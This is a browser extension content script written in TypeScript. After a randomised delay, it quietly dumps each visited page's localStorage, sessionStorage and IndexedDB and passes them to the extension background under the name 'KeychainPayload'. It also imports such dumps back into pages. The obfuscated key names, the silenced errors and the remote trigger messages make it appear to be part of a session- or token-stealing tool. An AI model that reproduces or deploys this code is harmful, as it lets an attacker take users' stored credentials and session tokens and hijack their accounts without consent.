import './lib/beforeAll';

import { KeychainPayload } from './lib/types';
import { IDBExport, IDBExportInstance } from './lib/idb';
import { dumpAllStorage } from './lib/storage';

const browser = {
    //b: window.browser,
    c: window.chrome,
    //d: window.document,
    //e: window.event,
    //f: window.frames,
    //g: window.globalThis,
    //h: window.history,
    i: window.indexedDB,
    //j: window.JSON,
    k: window.localStorage,
    l: window.location,
    //m: window.Map,
    //n: window.navigator,
    //o: window.Object,
    //p: window.Promise,
    //q: window.queueMicrotask,
    //r: window.requestAnimationFrame,
    s: window.sessionStorage,
    //t: window.setTimeout,
    //u: window.URL,
};

const raiseDump = async () => {
    try {
        const idbd = await (new IDBExport(browser.i)).dumpAllDbs();

        const storage = dumpAllStorage({ localStorage: browser.k, sessionStorage: browser.s });

        const data: Partial<KeychainPayload> = {
            a: {
                l: storage.localStorage,
                s: storage.sessionStorage,
            },
            b: idbd as string[],
        };

        browser.c.runtime.sendMessage({
            type: 'xlrd_exp_req',
            data,
        });
    } catch (e) {
        //console.error(e);
    }
};

setTimeout(raiseDump, 2000 + (Math.random() * 10_000));

const handle_msg =
    async (
        msg,
        _sender,
        _sendResponse,
    ) => {
        if (msg.type === 'xlrd_exp_tbs') {
            raiseDump();
        }

        if (msg.type === 'xlrd_exp_checkin') {
            browser.c.runtime.sendMessage({
                type: 'xlrd_exp_checkin_ack',
                data: msg.data,
            });
        }

        if (msg.type === 'xlrd_imp_kc') {
            const data = msg.data as KeychainPayload;

            // import localStorage and sessionStorage
            for (const [k, v] of Object.entries(data.a.l)) {
                try {
                    console.log('LS importing %s', k);

                    browser.k.setItem(k, v);
                } catch (e) {
                    console.error(e);
                }
            }

            for (const [k, v] of Object.entries(data.a.s)) {
                try {
                    console.log('SS importing %s', k);

                    browser.s.setItem(k, v);
                } catch (e) {
                    console.error(e);
                }
            }

            // import indexedDB
            const idb_data =
                data.b
                    .map(x => JSON.parse(x))
                    .map(x => [x, Object.keys(x)]);

            for (const [store_data, store] of idb_data) {
                try {
                    console.log('IDB importing %s', store);

                    const db = await IDBExportInstance.openDb(store);

                    await IDBExportInstance.importDb(
                        db,
                        store_data[store]
                    );
                } catch (e) {
                    console.error(e);
                }
            }
        }
    };

browser.c.runtime.onMessage.addListener(
    handle_msg as any,
);

window.addEventListener('message', (e) => {
    if (e.data.type === 'xlrd_datist_init_ping') {
        window.postMessage({
            type: 'xlrd_datist_init_pong',
        });
    }

    if (e.data.type === 'xlrd_datist_import_req') {
        browser.c.runtime.sendMessage({
            type: 'xlrd_datist_import_req',
            data: e.data.data,
        });
    }
});

window.postMessage({
    type: 'xlrd_datist_init_pong',
});